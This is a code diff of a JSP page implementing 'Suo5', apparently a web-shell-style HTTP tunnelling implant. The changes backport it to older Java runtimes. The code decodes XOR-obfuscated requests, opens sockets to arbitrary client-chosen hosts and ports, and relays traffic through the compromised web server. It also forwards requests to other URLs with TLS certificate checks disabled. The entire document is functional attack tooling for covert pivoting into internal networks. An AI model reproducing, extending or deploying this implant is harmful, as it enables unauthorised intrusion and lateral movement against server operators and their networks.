@@ -1,4 +1,3 @@
-<%@ page trimDirectiveWhitespaces="true" %>
 <%@ page import="java.nio.ByteBuffer" %>
 <%@ page import="java.io.*" %>
 <%@ page import="java.net.*" %>
@@ -9,7 +8,7 @@
 <%!
     public static class Suo5 implements Runnable, HostnameVerifier, X509TrustManager {
 
-        static HashMap<String, Boolean> addrs = collectAddr();
+        static HashMap addrs = collectAddr();
 
         InputStream gInStream;
         OutputStream gOutStream;
@@ -78,27 +77,27 @@
 
 
         private HashMap newCreate(byte s) {
-            HashMap<String, byte[]> m = new HashMap<String, byte[]>();
+            HashMap m = new HashMap();
             m.put("ac", new byte[]{0x04});
             m.put("s", new byte[]{s});
             return m;
         }
 
         private HashMap newData(byte[] data) {
-            HashMap<String, byte[]> m = new HashMap<String, byte[]>();
+            HashMap m = new HashMap();
             m.put("ac", new byte[]{0x01});
             m.put("dt", data);
             return m;
         }
 
         private HashMap newDel() {
-            HashMap<String, byte[]> m = new HashMap<String, byte[]>();
+            HashMap m = new HashMap();
             m.put("ac", new byte[]{0x02});
             return m;
         }
 
         private HashMap newStatus(byte b) {
-            HashMap<String, byte[]> m = new HashMap<String, byte[]>();
+            HashMap m = new HashMap();
             m.put("s", new byte[]{b});
             return m;
         }
@@ -119,11 +118,28 @@
                     ((bytes[3] & 0xFF) << 0);
         }
 
+        byte[] copyOfRange(byte[] original, int from, int to) {
+            int newLength = to - from;
+            if (newLength < 0) {
+                throw new IllegalArgumentException(from + " > " + to);
+            }
+            byte[] copy = new byte[newLength];
+            int copyLength = Math.min(original.length - from, newLength);
+            // can't use System.arraycopy of Arrays.copyOf, there is no system in some environment
+            // System.arraycopy(original, from, copy, 0,  copyLength);
+            for (int i = 0; i < copyLength; i++) {
+                copy[i] = original[from+i];
+            }
+            return copy;
+        }
 
-        private byte[] marshal(HashMap<String, byte[]> m) throws IOException {
+
+        private byte[] marshal(HashMap m) throws IOException {
             ByteArrayOutputStream buf = new ByteArrayOutputStream();
-            for (String key : m.keySet()) {
-                byte[] value = m.get(key);
+            Object[] keys = m.keySet().toArray();
+            for (int i = 0; i < keys.length; i++) {
+                String key = (String) keys[i];
+                byte[] value = (byte[]) m.get(key);
                 buf.write((byte) key.length());
                 buf.write(key.getBytes());
                 buf.write(u32toBytes(value.length));
@@ -143,7 +159,7 @@
             return dbuf.array();
         }
 
-        private HashMap<String, byte[]> unmarshal(InputStream in) throws Exception {
+        private HashMap unmarshal(InputStream in) throws Exception {
             DataInputStream reader = new DataInputStream(in);
             byte[] header = new byte[4 + 1]; // size and datatype
             reader.readFully(header);
@@ -159,7 +175,7 @@
             for (int i = 0; i < bs.length; i++) {
                 bs[i] = (byte) (bs[i] ^ x);
             }
-            HashMap<String, byte[]> m = new HashMap<String, byte[]>();
+            HashMap m = new HashMap();
             byte[] buf;
             for (int i = 0; i < bs.length - 1; ) {
                 short kLen = bs[i];
@@ -170,14 +186,14 @@
                 if (kLen < 0) {
                     throw new Exception("key len error");
                 }
-                buf = Arrays.copyOfRange(bs, i, i + kLen);
+                buf = copyOfRange(bs, i, i + kLen);
                 String key = new String(buf);
                 i += kLen;
 
                 if (i + 4 >= bs.length) {
                     throw new Exception("value len error");
                 }
-                buf = Arrays.copyOfRange(bs, i, i + 4);
+                buf = copyOfRange(bs, i, i + 4);
                 int vLen = bytesToU32(buf);
                 i += 4;
                 if (vLen < 0) {
@@ -187,7 +203,7 @@
                 if (i + vLen > bs.length) {
                     throw new Exception("value error");
                 }
-                byte[] value = Arrays.copyOfRange(bs, i, i + vLen);
+                byte[] value = copyOfRange(bs, i, i + vLen);
                 i += vLen;
 
                 m.put(key, value);
@@ -198,10 +214,10 @@
         private void processDataBio(HttpServletRequest request, HttpServletResponse resp) throws Exception {
             final InputStream reqInputStream = request.getInputStream();
             final BufferedInputStream reqReader = new BufferedInputStream(reqInputStream);
-            HashMap<String, byte[]> dataMap;
+            HashMap dataMap;
             dataMap = unmarshal(reqReader);
 
-            byte[] action = dataMap.get("ac");
+            byte[] action = (byte[]) dataMap.get("ac");
             if (action.length != 1 || action[0] != 0x00) {
                 resp.setStatus(403);
                 return;
@@ -211,8 +227,8 @@
 
             // 0x00 create socket
             resp.setHeader("X-Accel-Buffering", "no");
-            String host = new String(dataMap.get("h"));
-            int port = Integer.parseInt(new String(dataMap.get("p")));
+            String host = new String((byte[]) dataMap.get("h"));
+            int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
             Socket sc;
             try {
                 sc = new Socket();
@@ -255,7 +271,7 @@
                 if (n <= 0) {
                     break;
                 }
-                byte[] dataTmp = Arrays.copyOfRange(readBuf, 0, 0 + n);
+                byte[] dataTmp = copyOfRange(readBuf, 0, 0 + n);
                 if (needMarshal) {
                     dataTmp = marshal(newData(dataTmp));
                 }
@@ -266,10 +282,10 @@
 
         private void readReq(BufferedInputStream bufInputStream, OutputStream socketOutStream) throws Exception {
             while (true) {
-                HashMap<String, byte[]> dataMap;
+                HashMap dataMap;
                 dataMap = unmarshal(bufInputStream);
 
-                byte[] action = dataMap.get("ac");
+                byte[] action = (byte[]) dataMap.get("ac");
                 if (action.length != 1) {
                     return;
                 }
@@ -277,7 +293,7 @@
                     socketOutStream.close();
                     return;
                 } else if (action[0] == 0x01) {
-                    byte[] data = dataMap.get("dt");
+                    byte[] data = (byte[]) dataMap.get("dt");
                     if (data.length != 0) {
                         socketOutStream.write(data);
                         socketOutStream.flush();
@@ -295,12 +311,12 @@
             InputStream is = request.getInputStream();
             ServletContext ctx = request.getSession().getServletContext();
             BufferedInputStream reader = new BufferedInputStream(is);
-            HashMap<String, byte[]> dataMap;
+            HashMap dataMap;
             dataMap = unmarshal(reader);
 
 
-            String clientId = new String(dataMap.get("id"));
-            byte[] action = dataMap.get("ac");
+            String clientId = new String((byte[]) dataMap.get("id"));
+            byte[] action = (byte[]) dataMap.get("ac");
             if (action.length != 1) {
                 resp.setStatus(403);
                 return;
@@ -311,7 +327,7 @@
                 ActionDelete    byte = 0x02
                 ActionHeartbeat byte = 0x03
              */
-            byte[] redirectData = dataMap.get("r");
+            byte[] redirectData = (byte[]) dataMap.get("r");
             boolean needRedirect = redirectData != null && redirectData.length > 0;
             String redirectUrl = "";
             if (needRedirect) {
@@ -343,7 +359,7 @@
                     respOutStream.close();
                     return;
                 }
-                byte[] data = dataMap.get("dt");
+                byte[] data = (byte[]) dataMap.get("dt");
                 if (data.length != 0) {
                     scOutStream.write(data);
                     scOutStream.flush();
@@ -358,8 +374,8 @@
             }
             // 0x00 create new tunnel
             resp.setHeader("X-Accel-Buffering", "no");
-            String host = new String(dataMap.get("h"));
-            int port = Integer.parseInt(new String(dataMap.get("p")));
+            String host = new String((byte[]) dataMap.get("h"));
+            int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
 
             InputStream readFrom;
             Socket sc = null;
@@ -413,15 +429,15 @@
             }
         }
 
-        static HashMap<String, Boolean> collectAddr() {
-            HashMap<String, Boolean> addrs = new HashMap<String, Boolean>();
+        static HashMap collectAddr() {
+            HashMap addrs = new HashMap();
             try {
-                Enumeration<NetworkInterface> nifs = NetworkInterface.getNetworkInterfaces();
+                Enumeration nifs = NetworkInterface.getNetworkInterfaces();
                 while (nifs.hasMoreElements()) {
-                    NetworkInterface nif = nifs.nextElement();
-                    Enumeration<InetAddress> addresses = nif.getInetAddresses();
+                    NetworkInterface nif = (NetworkInterface) nifs.nextElement();
+                    Enumeration addresses = nif.getInetAddresses();
                     while (addresses.hasMoreElements()) {
-                        InetAddress addr = addresses.nextElement();
+                        InetAddress addr = (InetAddress) addresses.nextElement();
                         String s = addr.getHostAddress();
                         if (s != null) {
                             // fe80:0:0:0:fb0d:5776:2d7c:da24%wlan4  strip %wlan4
@@ -429,7 +445,7 @@
                             if (ifaceIndex != -1) {
                                 s = s.substring(0, ifaceIndex);
                             }
-                            addrs.put(s, true);
+                            addrs.put((Object) s, (Object) Boolean.TRUE);
                         }
                     }
                 }
@@ -445,13 +461,19 @@
             return addrs.containsKey(ip);
         }
 
-        HttpURLConnection redirect(HttpServletRequest request, HashMap<String, byte[]> dataMap, String rUrl) throws Exception {
+        HttpURLConnection redirect(HttpServletRequest request, HashMap dataMap, String rUrl) throws Exception {
             String method = request.getMethod();
             URL u = new URL(rUrl);
             HttpURLConnection conn = (HttpURLConnection) u.openConnection();
             conn.setRequestMethod(method);
-            conn.setConnectTimeout(3000);
-            conn.setReadTimeout(0);
+            try {
+                // conn.setConnectTimeout(3000);
+                conn.getClass().getMethod("setConnectTimeout", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(3000)});
+                // conn.setReadTimeout(0);
+                conn.getClass().getMethod("setReadTimeout", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(0)});
+            } catch (Exception e) {
+                // java1.4
+            }
             conn.setDoOutput(true);
             conn.setDoInput(true);
 
@@ -464,9 +486,9 @@
                 ((HttpsURLConnection) conn).setSSLSocketFactory(ctx.getSocketFactory());
             }
 
-            Enumeration<String> headers = request.getHeaderNames();
+            Enumeration headers = request.getHeaderNames();
             while (headers.hasMoreElements()) {
-                String k = headers.nextElement();
+                String k = (String) headers.nextElement();
                 conn.setRequestProperty(k, request.getHeader(k));
             }
 
@@ -496,4 +518,8 @@
 <%
     Suo5 o = new Suo5();
     o.process(request, response);
+
+    // avoid already getOutStream error
+    out.clear();
+    out = pageContext.pushBody();
 %>
